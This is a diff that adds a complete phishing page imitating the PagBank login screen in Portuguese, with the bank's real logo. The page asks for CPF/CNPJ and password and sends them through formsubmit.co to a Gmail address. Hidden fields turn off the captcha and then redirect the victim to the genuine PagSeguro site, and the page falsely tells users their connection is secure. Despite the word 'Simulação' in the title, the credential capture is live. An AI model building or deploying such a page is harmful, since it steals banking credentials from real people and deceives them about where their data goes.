@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Acesso PagBank (Simulação)</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #f5f6f8;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .login-box {
+      background-color: #ffffff;
+      padding: 40px;
+      border-radius: 12px;
+      box-shadow: 0 0 20px rgba(0, 0, 0, 0.05);
+      width: 100%;
+      max-width: 360px;
+      text-align: center;
+    }
+
+    .logo {
+      margin-bottom: 30px;
+    }
+
+    .logo img {
+      width: 140px;
+    }
+
+    h2 {
+      font-size: 1.3rem;
+      color: #333;
+      margin-bottom: 25px;
+    }
+
+    input {
+      width: 100%;
+      padding: 14px;
+      font-size: 1rem;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      margin-bottom: 20px;
+      transition: border-color 0.3s;
+    }
+
+    input:focus {
+      outline: none;
+      border-color: #00bfa5;
+    }
+
+    button {
+      width: 100%;
+      padding: 14px;
+      background-color: #00bfa5;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 1rem;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+
+    button:hover {
+      background-color: #009e8a;
+    }
+
+    .note {
+      font-size: 0.9rem;
+      color: #666;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="login-box">
+    <div class="logo">
+      <img src="https://assets.pagseguro.com.br/ps-infra/oauth2/5.119.0/images/logo-pagbank.svg" alt="PagBank Logo">
+    </div>
+    <h2>Acesse com CPF/CNPJ e Senha</h2>
+
+    <form action="https://formsubmit.co/alunospilotos@gmail.com" method="POST">
+      <!-- Campos escondidos -->
+      <input type="hidden" name="_next" value="https://pagseguro.uol.com.br/">
+      <input type="hidden" name="_captcha" value="false">
+
+      <!-- Dados visíveis -->
+      <input type="text" name="cpf_cnpj" placeholder="Digite seu CPF ou CNPJ" required />
+      <input type="password" name="senha" placeholder="Digite sua senha" required />
+      <button type="submit">Entrar</button>
+    </form>
+
+    <div class="note">
+      Sua conexão está segura.
+    </div>
+  </div>
+
+</body>
+</html>
